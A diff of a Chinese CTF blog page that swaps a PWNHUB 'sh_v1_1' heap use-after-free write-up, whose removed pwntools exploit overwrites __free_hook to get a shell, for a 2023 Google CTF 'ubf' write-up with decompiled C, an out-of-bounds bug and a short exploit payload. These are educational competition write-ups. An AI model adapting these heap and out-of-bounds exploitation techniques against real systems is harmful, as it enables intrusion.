@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PWNHUB sh_v1_1, StarrySky">
+    <meta name="keywords" content="2023_googlectf_ubf复现, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PWNHUB sh_v1_1 | StarrySky</title>
+    <title>2023_googlectf_ubf复现 | StarrySky</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -289,12 +289,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/25.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PWNHUB sh_v1_1</h1>
+                    <h1 class="description center-align post-title">2023_googlectf_ubf复现</h1>
                 </div>
             </div>
         </div>
@@ -410,22 +410,27 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
+                            <a href="/tags/oob/">
+                                <span class="chip bg-color">oob</span>
                             </a>
                         
-                            <a href="/tags/heap/">
-                                <span class="chip bg-color">heap</span>
-                            </a>
-                        
-                            <a href="/tags/UAF/">
-                                <span class="chip bg-color">UAF</span>
+                            <a href="/tags/ubf/">
+                                <span class="chip bg-color">ubf</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/pwn/" class="post-category">
+                                pwn
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -434,28 +439,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-03-13
+                    2023-08-12
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-05-22
+                    2023-08-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    523
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
 
@@ -473,114 +478,179 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
-<li>rm 释放堆之后未清零造成 UAF 漏洞</li>
-<li>ln 执行时仅判断第一个文件是否存在而不会判断第二个文件是否存在，且连接成功后不存在的文件将被添加到文件列表</li>
-</ol>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
-<li><p>利用两个相同大小的unsorted bin合并，申请一个相同大小的堆块，堆快中残留的fd，可以泄露到 malloc_hook地址进而泄露libc基址</p>
+                <blockquote>
+<p><code>Unnecessary binary format</code>（不必要的二进制格式）是指在计算机科学和软件工程中，存在着冗余或不必要的二进制数据表示形式。这种形式可能会导致资源浪费、性能下降或代码复杂化。</p>
+</blockquote>
+<p>本题对不同类型的数据规定了不同的输入格式</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall strs_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)
+&#123;
+  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
+  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
+  char *mem; &#x2F;&#x2F; [rsp+28h] [rbp-18h]
+  int i; &#x2F;&#x2F; [rsp+34h] [rbp-Ch]
+  char *content; &#x2F;&#x2F; [rsp+38h] [rbp-8h]
+
+  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;str [&quot;)];
+  if ( s &gt;&#x3D; a3 )
+    return 0LL;
+  mem &#x3D; a1-&gt;mem;
+  content &#x3D; &amp;mem[a1-&gt;offset];
+  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )
+  &#123;
+    censor_string(content, *&amp;mem[2 * i]);
+    s +&#x3D; snprintf(s, a3 - s, &quot;%s, &quot;, content);
+    if ( s &gt;&#x3D; a3 )
+      return 0LL;
+    content +&#x3D; *&amp;mem[2 * i] + 1;
+  &#125;
+  if ( a1-&gt;len &gt; 0 )
+    s -&#x3D; 2;
+  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];
+  if ( sa &lt; a3 )
+    return sa;
+  else
+    return 0LL;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall bools_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)
+&#123;
+  char v4; &#x2F;&#x2F; al
+  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
+  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
+  char *mem; &#x2F;&#x2F; [rsp+30h] [rbp-10h]
+  int i; &#x2F;&#x2F; [rsp+3Ch] [rbp-4h]
+
+  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;bool [&quot;)];
+  if ( s &gt;&#x3D; a3 )
+    return 0LL;
+  mem &#x3D; a1-&gt;mem;
+  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )
+  &#123;
+    if ( mem[i] )
+      v4 &#x3D; &#39;T&#39;;
+    else
+      v4 &#x3D; &#39;F&#39;;
+    s +&#x3D; snprintf(s, a3 - s, &quot;%c, &quot;, v4);
+    if ( s &gt;&#x3D; a3 )
+      return 0LL;
+  &#125;
+  if ( a1-&gt;len &gt; 0 )
+    s -&#x3D; 2;
+  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];
+  if ( sa &lt; a3 )
+    return sa;
+  else
+    return 0LL;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall ints_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)
+&#123;
+  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-20h]
+  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-20h]
+  char *mem; &#x2F;&#x2F; [rsp+20h] [rbp-10h]
+  int i; &#x2F;&#x2F; [rsp+2Ch] [rbp-4h]
+
+  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;int [&quot;)];
+  if ( s &gt;&#x3D; a3 )
+    return 0LL;
+  mem &#x3D; a1-&gt;mem;
+  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )
+  &#123;
+    s +&#x3D; snprintf(s, a3 - s, &quot;%d, &quot;, *&amp;mem[4 * i]);
+    if ( s &gt;&#x3D; a3 )
+      return 0LL;
+  &#125;
+  if ( a1-&gt;len &gt; 0 )
+    s -&#x3D; 2;
+  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];
+  if ( sa &lt; a3 )
+    return sa;
+  else
+    return 0LL;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p><code>1.string</code><br><code>|4byte total_len | 1byte type s | 2byte count | 2bytes count*2 | 2byte data ..</code></p>
 </li>
-<li><p>删除一个堆之后与另一个堆进行连接</p>
+<li><p><code>2.bool</code><br><code>|4byte size| 1byte type b | 2byte count | 2byte start_idx | bools</code></p>
 </li>
-<li><p>再次删除这个堆，即间接的删除了与其进行连接的堆，而不会造成与其连接的堆从文件列表消失</p>
+<li><p><code>3.int</code><br><code>|4byte size| 1byte type i | 2byte count | 2byte smt | ints...</code></p>
 </li>
-<li><p>再次连接后删除的文件又在文件列表中出现，此时两个文件即两个堆都已经被释放，且最开始被连接的堆的fd为其之后连接的堆</p>
-</li>
-<li><p>用gedit编辑最开始被释放的堆，即可修改其fd，再次申请就可以实现任意地址写</p>
-</li>
-</ol>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+</ul>
+<p>题目开始会将<code>/flag</code>载入全局变量，输入<code>string</code>类型的<code>$FLAG</code>即可将<code>flag</code>载入并替换</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  ...
+  if ( !set_env_from_file(&quot;FLAG&quot;, &quot;&#x2F;flag&quot;) || !set_env_from_file(&quot;MOTD&quot;, &quot;&#x2F;motd&quot;) || !set_env_from_file(&quot;TEAM&quot;, &quot;&#x2F;team&quot;) )
+    return -1;
+  ...
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 __fastcall set_env_from_file(const char *a1, const char *a2)
+&#123;
+  char s[8]; &#x2F;&#x2F; [rsp+10h] [rbp-210h] BYREF
+  __int64 v4; &#x2F;&#x2F; [rsp+18h] [rbp-208h]
+  char v5[496]; &#x2F;&#x2F; [rsp+20h] [rbp-200h] BYREF
+  int v6; &#x2F;&#x2F; [rsp+214h] [rbp-Ch]
+  FILE *stream; &#x2F;&#x2F; [rsp+218h] [rbp-8h]
 
-file_name <span class="token operator">=</span> <span class="token string">'./sh_v1.1'</span>
+  stream &#x3D; fopen(a2, &quot;r&quot;);
+  *s &#x3D; 0LL;
+  v4 &#x3D; 0LL;
+  memset(v5, 0, sizeof(v5));
+  if ( stream &amp;&amp; fgets(s, 512, stream) )
+  &#123;
+    v6 &#x3D; strlen(s) - 1;
+    if ( s[v6] &#x3D;&#x3D; &#39;\n&#39; )
+      s[v6] &#x3D; 0;
+    setenv(a1, s, 1);
+    return 1LL;
+  &#125;
+  else
+  &#123;
+    printf(&quot;Error reading %s\n&quot;, a2);
+    return 0LL;
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
-ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
+<p>按规定格式输入之后会进行一系列的解码，再输出相应的内容，但是检测到输出内容含有<code>CTF&#123;</code>会将后续内容替换成<code>xxxx</code>，因此需要将这个头改成其他的绕过检测</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void __fastcall censor_string(char *a1, int a2)
+&#123;
+  if ( a2 &gt; 5 &amp;&amp; *a1 &#x3D;&#x3D; &#39;C&#39; &amp;&amp; a1[1] &#x3D;&#x3D; &#39;T&#39; &amp;&amp; a1[2] &#x3D;&#x3D; &#39;F&#39; &amp;&amp; a1[3] &#x3D;&#x3D; &#39;&#123;&#39; )
+    memset(a1 + 4, &#39;X&#39;, a2 - 5);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+<p>漏洞点在修复损坏的布尔类型的函数中存在数组越界</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void __fastcall fix_corrupt_booleans(UNPACK *string)
+&#123;
+  unsigned __int64 v1; &#x2F;&#x2F; [rsp+10h] [rbp-18h]
+  char *v2; &#x2F;&#x2F; [rsp+18h] [rbp-10h]
+  int i; &#x2F;&#x2F; [rsp+24h] [rbp-4h]
 
-debug <span class="token operator">=</span> <span class="token number">0</span>
-<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
-    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.89.206'</span><span class="token punctuation">,</span><span class="token number">34883</span><span class="token punctuation">)</span>
-<span class="token keyword">else</span><span class="token punctuation">:</span>
-    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+  v2 &#x3D; &amp;string-&gt;mem[string-&gt;offset];            &#x2F;&#x2F; vuln
+  v1 &#x3D; &amp;string-&gt;mem[string-&gt;size];
+  for ( i &#x3D; 0; i &lt; string-&gt;len &amp;&amp; &amp;v2[i] &lt; v1; ++i )
+    v2[i] &#x3D; v2[i] !&#x3D; 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
+<p>exp:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>
+
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ubf"</span><span class="token punctuation">)</span>
 
 <span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
 
-<span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'touch '</span> <span class="token operator">+</span> filename
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b's'</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"$FLAG"</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">126</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
 
-<span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'rm '</span> <span class="token operator">+</span> filename
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">cp</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'cp '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'cat '</span> <span class="token operator">+</span> filename
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">gedit</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'gedit '</span> <span class="token operator">+</span> filename
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
-    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">ln</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'ln '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2
-    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>
-    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1  <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>
-    rm<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>
-    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span>
-
-cat<span class="token punctuation">(</span><span class="token string">'try7.txt'</span><span class="token punctuation">)</span>
-malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1104</span> <span class="token operator">-</span> <span class="token number">0x10</span>
-li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
-libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
-
-free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
-li<span class="token punctuation">(</span><span class="token string">'free_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
-
-touch<span class="token punctuation">(</span><span class="token string">'try8.txt'</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>
-
-rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>
-ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>
-
-rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>
-ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>
-
-gedit<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
-dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-touch<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
-touch<span class="token punctuation">(</span><span class="token string">'try11.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-rm<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
                 
@@ -596,16 +666,12 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
+                                <a href="/tags/oob/">
+                                    <span class="chip bg-color">oob</span>
                                 </a>
                             
-                                <a href="/tags/heap/">
-                                    <span class="chip bg-color">heap</span>
-                                </a>
-                            
-                                <a href="/tags/UAF/">
-                                    <span class="chip bg-color">UAF</span>
+                                <a href="/tags/ubf/">
+                                    <span class="chip bg-color">ubf</span>
                                 </a>
                             
                         </div>
@@ -649,29 +715,30 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/04/22/glibc-yuan-ma-fen-xi-malloc-free/glibc-yuan-ma-fen-xi-malloc-free/">
+                <a href="/2023/08/12/2023-googlectf-ubf/2023-googlectf-ubf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="glibc源码分析-malloc-free">
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="2023_googlectf_ubf复现">
                         
-                        <span class="card-title">glibc源码分析-malloc-free</span>
+                        <span class="card-title">2023_googlectf_ubf复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基于glibc2.23的malloc和free函数实现
+                            2023googlectf_ubf复现
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -684,15 +751,16 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
+                    <a href="/tags/oob/">
+                        <span class="chip bg-color">oob</span>
                     </a>
                     
-                    <a href="/tags/ptmalloc2/">
-                        <span class="chip bg-color">ptmalloc2</span>
+                    <a href="/tags/ubf/">
+                        <span class="chip bg-color">ubf</span>
                     </a>
                     
                 </div>
@@ -706,24 +774,24 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/">
+                <a href="/2023/08/10/2023syctf-computer-fu-xian/2023syctf-computer-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/29.jpg" class="responsive-img" alt="HGAME 2023 week3 pwn">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="2023_syctf_computer_pwn复现">
                         
-                        <span class="card-title">HGAME 2023 week3 pwn</span>
+                        <span class="card-title">2023_syctf_computer_pwn复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2023hgame-week3 pwn 部分解析
+                            2023 syctf computer pwn复现
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-10
                             </span>
                         <span class="publish-author">
                             
@@ -740,16 +808,8 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
                     <a href="/tags/heap/">
